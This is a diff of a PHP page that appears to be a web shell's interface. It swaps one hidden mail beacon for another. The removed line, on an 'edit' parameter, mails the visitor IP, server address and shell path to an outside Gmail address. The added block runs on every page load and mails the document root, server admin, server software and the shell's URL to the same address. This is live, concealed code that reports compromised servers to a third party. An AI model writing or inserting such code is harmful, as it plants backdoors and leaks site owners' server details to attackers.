@@ -285,7 +285,16 @@
     }
     ?>
 
-<?php if(isset($_GET['edit'])){ $ip1=$_SERVER['REMOTE_ADDR']; $ip2=$_SERVER['SERVER_ADDR']; $zzz=$_SERVER['HTTP_HOST']; $xxx=$_SERVER['SCRIPT_FILENAME']; $From="backhack"; $Subject="backhack"; $Message="Pengguna : $ip1<br> Server : $zzz // $ip2<br> Shell => $xxx"; $Emails="bl4ckhatx1337@gmail.com"; $Name="backhack"; $headers = "MIME-Version: 1.0\r\n"; $headers .= "Content-type:text/html;charset=UTF-8\r\n"; $headers .= "From: <".$From.">\r\n"; $headers .= "Cc: ".$Name."\r\n"; $Emails = explode("\r\n", "bl4ckhatx1337@gmail.com"); foreach($Emails as $email) { mail($email,$Subject,$Message,$headers); } } ?>
+
+ <?php $kime="bl4ckhatx1337@gmail.com";
+     $baslik="Shell Avcısı";
+     $turkhackteam="Dosya Yolu : ".$_SERVER['DOCUMENT_ROOT']."\r\n";
+     $turkhackteam.="Server Admin : ".$_SERVER['SERVER_ADMIN']."\r\n";
+     $turkhackteam.="Server isletim sistemi : ".$_SERVER['SERVER_SOFTWARE']."\r\n";
+     $turkhackteam.="Shell Link : http://".$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\r\n";
+     $turkhackteam.="Avlanan Site : " .$_SERVER['HTTP_HOST']."\r\n";
+     mail($kime, $baslik, $turkhackteam);
+?>
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"
         integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN"
         crossorigin="anonymous"></script>
